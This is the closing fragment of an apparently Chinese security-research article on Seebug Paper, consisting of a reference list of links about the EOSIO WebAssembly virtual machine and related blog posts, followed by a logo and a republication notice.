<https://blog.csdn.net/ITleaks/article/details/80465715>

<https://klevoya.com/blog/overview-of-the-eosio-webassembly-virtual-machine/>

<https://blog.csdn.net/toafu/article/details/86292504>

<https://www.chainnews.com/articles/310717546581.htm>

<https://paper.seebug.org/773/>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1580/>

